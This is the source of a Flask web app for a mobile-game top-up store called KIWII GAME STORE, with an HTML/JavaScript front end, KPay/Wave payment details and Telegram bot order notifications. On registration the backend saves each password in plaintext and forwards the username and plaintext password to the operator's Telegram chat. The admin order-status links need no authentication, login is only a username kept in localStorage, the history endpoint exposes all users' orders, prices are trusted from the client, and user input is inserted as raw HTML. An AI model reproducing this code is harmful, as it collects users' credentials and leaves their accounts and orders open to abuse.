HTML_CODE = '''
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
    body { background:#0f172a; color:white; font-family:sans-serif; margin:0; padding-bottom:80px; }
    #main-container { max-width:500px; margin:auto; }
    .header-logo { text-align:center; padding:25px 0; color:#fbbf24; font-size:26px; font-weight:bold; }
    
    /* Auth UI */
    .auth-box { padding: 40px 20px; text-align: center; }
    .auth-box h2 { color: #fbbf24; margin-bottom: 20px; }
    .auth-input { width:100%; padding:15px; margin:10px 0; border-radius:12px; background:#1e293b; color:white; border:1px solid #334155; box-sizing:border-box; }
    .auth-btn { width:100%; padding:16px; background:#fbbf24; border:none; border-radius:12px; font-weight:bold; color:black; cursor:pointer; }
    .auth-toggle { margin-top:20px; color:#94a3b8; font-size:14px; cursor:pointer; text-decoration: underline; }

    /* App UI */
    .user-banner { background:#1e293b; padding:12px 20px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #334155; }
    .logout-btn { color:#ef4444; font-weight:bold; cursor:pointer; font-size:13px; }
    
    .game-grid { display:grid; grid-template-columns:1fr 1fr; gap:15px; padding:20px; }
    .game-card { background:rgba(30, 41, 59, 0.85); border-radius:15px; padding:20px; text-align:center; border:1px solid #334155; cursor:pointer; }
    
    .cat-tabs { display:flex; gap:10px; overflow-x:auto; padding:10px 0; margin-bottom:15px; scrollbar-width: none; }
    .tab-btn { background:#1e293b; border:1px solid #334155; color:#94a3b8; padding:10px 15px; border-radius:10px; white-space:nowrap; cursor:pointer; font-size:14px; }
    .tab-btn.active { background:#fbbf24; color:black; font-weight:bold; }

    .pkg-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:15px 0; }
    .pkg-card { background:#1e293b; border:1px solid #334155; padding:15px; border-radius:12px; text-align:center; cursor:pointer; }
    .pkg-card.selected { border:2px solid #fbbf24; background:#1e3a8a; }
    
    .pay-box { background: #1e293b; padding: 20px; border-radius: 20px; border: 1.5px solid #fbbf24; text-align: center; margin-bottom: 20px; }
    .pay-icons { display: flex; justify-content: center; gap: 15px; margin-bottom: 15px; }
    .pay-icons img { width: 55px; height: 55px; border-radius: 12px; cursor: pointer; opacity: 0.6; }
    .pay-icons img.active { border: 2px solid #fbbf24; opacity: 1; transform: scale(1.1); }
    
    .buy-btn { width:100%; padding:16px; background:#fbbf24; border:none; border-radius:12px; font-weight:bold; color:black; cursor:pointer; margin-top:10px; }
    .nav-bar { position:fixed; bottom:0; width:100%; max-width:500px; background:#1e293b; display:flex; padding:12px 0; border-top:1px solid #334155; z-index:1000; }
    .nav-item { flex:1; text-align:center; color:#94a3b8; cursor:pointer; font-size:12px; }
    .nav-item.active { color:#fbbf24; font-weight:bold; }

    /* Personal Rank Style */
    .my-rank-card { margin-top:20px; padding:15px; background:linear-gradient(135deg, #fbbf24, #f59e0b); color:black; border-radius:12px; text-align:center; box-shadow: 0 4px 15px rgba(251, 191, 36, 0.3); }
</style>
</head><body>
<div id="main-container">
    <div id="auth-sec" class="auth-box">
        <div class="header-logo">KIWII GAME STORE</div>
        <div id="login-form">
            <h2>LOGIN</h2>
            <input type="text" id="l-user" class="auth-input" placeholder="Telegram Username (e.g. @kiwii)">
            <input type="password" id="l-pass" class="auth-input" placeholder="Password">
            <button class="auth-btn" onclick="handleAuth('login')">LOGIN</button>
            <div class="auth-toggle" onclick="toggleAuth()">No account? Register here</div>
        </div>
        <div id="reg-form" style="display:none;">
            <h2>REGISTER</h2>
            <p style="color:#94a3b8; font-size:13px; margin-bottom:10px;">Telegram Username ( Eg. @Bby_kiwii7 )</p>
            <input type="text" id="r-user" class="auth-input" placeholder="Username (must start with @)">
            <input type="password" id="r-pass" class="auth-input" placeholder="Create Password">
            <button class="auth-btn" onclick="handleAuth('register')">CREATE ACCOUNT</button>
            <div class="auth-toggle" onclick="toggleAuth()">Already have an account? Login</div>
        </div>
    </div>

    <div id="app-sec" style="display:none;">
        <div class="user-banner">
            <span>👤 <b id="display-user"></b></span>
            <span class="logout-btn" onclick="logout()">LOGOUT <i class="fas fa-sign-out-alt"></i></span>
        </div>

        <div id="h-sec">
            <div class="header-logo">KIWII GAME STORE</div>
            <div class="game-grid" id="g-list"></div>
        </div>

        <div id="o-sec" style="display:none; padding:15px;">
            <button onclick="goH()" style="background:none;color:white;border:1px solid #334155;padding:8px 15px;border-radius:8px;margin-bottom:15px;">← Back</button>
            <h2 id="g-title" style="color:#fbbf24;"></h2>
            <div id="cat-container" class="cat-tabs"></div>
            <div id="p-list" class="pkg-grid"></div>

            <div class="pay-box">
                <div class="pay-icons">
                    <img src="/static/kpay.jpg" class="active" onclick="setPay(this, '09775394979', 'Kpay')">
                    <img src="/static/wave.jpg" onclick="setPay(this, '09775394979', 'Wave')">
                </div>
                <div style="margin-top:10px;">
                    <b id="pay-type">KPAY ACCOUNT</b><br>
                    <span id="pay-num" style="font-size:20px;">09775394979</span>
                </div>
            </div>

            <form id="orderForm" onsubmit="handleOrder(event)">
                <input type="text" id="uid" placeholder="Game ID" required class="auth-input">
                <input type="text" id="zid" placeholder="Zone ID" required class="auth-input">
                <input type="file" id="photo" required accept="image/*" class="auth-input">
                <button type="submit" class="buy-btn" id="submitBtn">PLACE ORDER</button>
            </form>
        </div>

        <div id="top-sec" style="display:none; padding:15px;"><h3 style="color:#fbbf24; text-align:center;">🏆 TOP 10 USERS</h3><div id="top-list"></div></div>
        <div id="hist-sec" style="display:none; padding:15px;"><h3 style="color:#fbbf24;">History</h3><div id="hist-list"></div></div>

        <div class="nav-bar">
            <div class="nav-item active" id="nav-home" onclick="goH()"><i class="fas fa-home"></i><br>Home</div>
            <div class="nav-item" id="nav-hist" onclick="showH()"><i class="fas fa-history"></i><br>History</div>
            <div class="nav-item" id="nav-top" onclick="showTop()"><i class="fas fa-trophy"></i><br>Top 10</div>
            <div class="nav-item" onclick="window.open('{{ cs_link }}')"><i class="fas fa-headset"></i><br>CS</div>
        </div>
    </div>
</div>

<script>
let currentUser = localStorage.getItem('user');
let sel_srv='', sel_pkg='', sel_prc='';
const games = {{ games | tojson }};

function checkAuth() {
    if(currentUser) {
        document.getElementById('auth-sec').style.display='none';
        document.getElementById('app-sec').style.display='block';
        document.getElementById('display-user').innerText = currentUser;
        init();
    }
}
checkAuth();

function toggleAuth() {
    const isLogin = document.getElementById('login-form').style.display !== 'none';
    document.getElementById('login-form').style.display = isLogin ? 'none' : 'block';
    document.getElementById('reg-form').style.display = isLogin ? 'block' : 'none';
}

async function handleAuth(type) {
    const user = document.getElementById(type==='login'?'l-user':'r-user').value.trim();
    const pass = document.getElementById(type==='login'?'l-pass':'r-pass').value;
    if(!user || !pass) return alert("Please fill all fields");
    if(!user.startsWith('@')) return alert("Username must start with @");

    const r = await fetch('/api/auth', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({type, user, pass})
    });
    const res = await r.json();
    if(res.success) {
        localStorage.setItem('user', user);
        location.reload();
    } else { alert(res.msg); }
}

function logout() {
    localStorage.removeItem('user');
    location.reload();
}

function init() {
    document.getElementById('g-list').innerHTML = games.map(g => `
        <div class="game-card" onclick="selG(${g.id})">
            <img src="${g.img}" width="65" style="border-radius:12px;"><br>
            <b style="display:block;margin-top:12px;">${g.name}</b>
        </div>`).join('');
}

function selG(id) {
    const g = games.find(i => i.id === id);
    sel_srv = id;
    document.getElementById('h-sec').style.display='none';
    document.getElementById('o-sec').style.display='block';
    document.getElementById('g-title').innerText = g.name;
    const cats = g.cat_order;
    document.getElementById('cat-container').innerHTML = cats.map((c, i) => `<div class="tab-btn ${i===0?'active':''}" onclick="renderP('${c}', this)">${c}</div>`).join('');
    renderP(cats[0], document.querySelector('.tab-btn.active'));
}

function renderP(cat, btn) {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    const pkgs = games.find(i => i.id === sel_srv).cats[cat];
    document.getElementById('p-list').innerHTML = pkgs.map(p => `<div class="pkg-card" onclick="selP(this, '${p.d}', '${p.p}')"><span>${p.d}</span><br><b>${p.p} Ks</b></div>`).join('');
}

function selP(el, d, p) {
    document.querySelectorAll('.pkg-card').forEach(c=>c.classList.remove('selected'));
    el.classList.add('selected'); sel_pkg=d; sel_prc=p;
}

function setPay(img, num, type) {
    document.querySelectorAll('.pay-icons img').forEach(i => i.classList.remove('active'));
    img.classList.add('active');
    document.getElementById('pay-num').innerText = num;
    document.getElementById('pay-type').innerText = type + " ACCOUNT";
}

function updateNav(id) {
    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

async function handleOrder(e) {
    e.preventDefault();
    if(!sel_pkg) return alert("Package ရွေးပေးပါ။");
    const btn = document.getElementById('submitBtn');
    btn.innerText = "SENDING..."; btn.disabled = true;
    
    const fd = new FormData();
    fd.append('tg_user', currentUser);
    fd.append('uid', document.getElementById('uid').value);
    fd.append('zid', document.getElementById('zid').value);
    fd.append('server', games.find(i=>i.id===sel_srv).name);
    fd.append('pkg', sel_pkg);
    fd.append('price', sel_prc);
    fd.append('photo', document.getElementById('photo').files[0]);

    try {
        const r = await fetch('/order', { method: 'POST', body: fd });
        if(await r.text() === "Success") { alert("Order Successful!"); location.reload(); }
        else { alert("Order Failed."); }
    } catch(err) { alert("Error"); }
    btn.innerText = "PLACE ORDER"; btn.disabled = false;
}

function goH() {
    document.getElementById('h-sec').style.display='block';
    document.getElementById('o-sec').style.display='none';
    document.getElementById('top-sec').style.display='none';
    document.getElementById('hist-sec').style.display='none';
    updateNav('nav-home');
}

async function showTop() {
    document.getElementById('h-sec').style.display='none';
    document.getElementById('o-sec').style.display='none';
    document.getElementById('hist-sec').style.display='none';
    document.getElementById('top-sec').style.display='block';
    updateNav('nav-top');
    const r = await fetch(`/api/top10?user=${currentUser}`);
    const data = await r.json();
    
    let topHtml = data.top10.map((u, i) => `
        <div style="background:#1e293b;padding:15px;margin-bottom:10px;border-radius:12px;display:flex;justify-content:space-between;align-items:center;">
            <span><b style="color:#fbbf24;">#${i+1}</b> ${u._id}</span>
            <b style="color:#fbbf24;">${u.totalSpent.toLocaleString()} Ks</b>
        </div>`).join('') || "No data";

    let personalHtml = `
        <div class="my-rank-card">
            <p style="margin:0; font-size:14px; font-weight:bold;">MY CURRENT STATUS</p>
            <div style="font-size:22px; font-weight:bold; margin:5px 0;">Rank: #${data.userRank}</div>
            <p style="margin:0; font-size:14px;">Total Spent: ${data.userSpent.toLocaleString()} Ks</p>
        </div>`;

    document.getElementById('top-list').innerHTML = topHtml + personalHtml;
}

async function showH() {
    document.getElementById('h-sec').style.display='none'; 
    document.getElementById('o-sec').style.display='none';
    document.getElementById('top-sec').style.display='none'; 
    document.getElementById('hist-sec').style.display='block';
    updateNav('nav-hist');
    const r = await fetch('/api/history');
    const data = await r.json();
    document.getElementById('hist-list').innerHTML = data.filter(o => o.tg_user === currentUser).map(o => `
        <div style="background:#1e293b; padding:15px; margin-bottom:10px; border-radius:12px; border-left:5px solid ${o.status==='Completed'?'#22c55e':'#fbbf24'};">
            <b>${o.pkg}</b><br><small>${o.date} - ${o.status}</small>
        </div>`).join('') || "No history";
}
</script></body></html>
'''

# --- 🚀 BACKEND ---
users_col = db['users']

@app.route('/')
def index():
    return render_template_string(HTML_CODE, games=GAMES_DATA, cs_link=CS_TELEGRAM)

@app.route('/api/auth', methods=['POST'])
def auth():
    data = request.json
    utype, user, psw = data['type'], data['user'], data['pass']
    if utype == 'register':
        if users_col.find_one({"user": user}):
            return jsonify({"success": False, "msg": "Username already exists"})
        
        # Database သိမ်းခြင်း
        users_col.insert_one({"user": user, "pass": psw, "date": datetime.now().strftime("%d/%m/%Y")})
        
        # 🔔 Bot ဆီကို Register Info ပို့ခြင်း
        reg_msg = f"<b>🆕 New Account Registered!</b>\\n\\n👤 User: <code>{user}</code>\\n🔑 Pass: <code>{psw}</code>"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": reg_msg, "parse_mode": "HTML"})
        
        return jsonify({"success": True})
    else:
        u = users_col.find_one({"user": user, "pass": psw})
        if u: return jsonify({"success": True})
        return jsonify({"success": False, "msg": "Invalid Credentials"})

@app.route('/order', methods=['POST'])
def order():
    try:
        tg_user = request.form.get('tg_user')
        uid = request.form.get('uid'); zid = request.form.get('zid')
        pkg = request.form.get('pkg'); srv = request.form.get('server')
        photo = request.files.get('photo')
        
        raw_price = request.form.get('price', '0')
        price_str = str(raw_price).replace(' Ks', '').replace(',', '').strip()
        price = int(price_str) if price_str.isdigit() else 0

        oid = orders_col.insert_one({
            "tg_user": tg_user, "uid": uid, "zone": zid, "pkg": pkg, "srv": srv, 
            "price": price, "status": "Pending", 
            "date": datetime.now(timezone(timedelta(hours=6, minutes=30))).strftime("%d/%m/%Y %I:%M %p")
        }).inserted_id
        
        base_url = "https://kiwiigameshop.onrender.com"
        keyboard = {"inline_keyboard": [[
            {"text": "Done ✅", "url": f"{base_url}/admin/status/done/{oid}"},
            {"text": "Reject ❌", "url": f"{base_url}/admin/status/reject/{oid}"}
        ]]}
        
        msg = f"<b>⚠️ New Order!</b>\\n\\n<b>👤 User:</b> {tg_user}\\n<b>🌍 Server:</b> {srv}\\n<b>🆔 ID:</b> <code>{uid}</code> ({zid})\\n<b>📦 Package:</b> {pkg}\\n<b>💰 Price:</b> {price} Ks"
        
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
            data={"chat_id": CHAT_ID, "caption": msg, "parse_mode": "HTML", "reply_markup": json.dumps(keyboard)}, 
            files={"photo": photo})
        
    except Exception as e:
        return str(e), 500
    return "Success"

@app.route('/admin/status/<action>/<oid>')
def update_status(action, oid):
    new_status = "Completed" if action == "done" else "Rejected"
    orders_col.update_one({"_id": ObjectId(oid)}, {"$set": {"status": new_status}})
    return f"<html><body style='background:#0f172a;color:white;text-align:center;padding:50px;'><h1>Order {new_status}!</h1></body></html>"

@app.route('/api/history')
def history():
    hist = list(orders_col.find().sort("_id", -1).limit(30))
    for h in hist: h['_id'] = str(h['_id'])
    return jsonify(hist)

@app.route('/api/top10')
def top10():
    current_user = request.args.get('user')
    
    # User အားလုံးရဲ့ ဝယ်ယူမှုပမာဏ (Completed Order များသာ)
    pipeline = [
        {"$match": {"tg_user": {"$nin": ADMIN_USERNAMES}, "status": "Completed"}},
        {"$group": {"_id": "$tg_user", "totalSpent": {"$sum": "$price"}}},
        {"$sort": {"totalSpent": -1}}
    ]
    all_ranks = list(orders_col.aggregate(pipeline))
    
    # Top 10 list
    top10_list = all_ranks[:10]
    
    # Personal Rank ရှာခြင်း
    user_rank = "N/A"
    user_spent = 0
    for index, item in enumerate(all_ranks):
        if item['_id'] == current_user:
            user_rank = index + 1
            user_spent = item['totalSpent']
            break
            
    return jsonify({
        "top10": top10_list,
        "userRank": user_rank,
        "userSpent": user_spent
    })

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
    
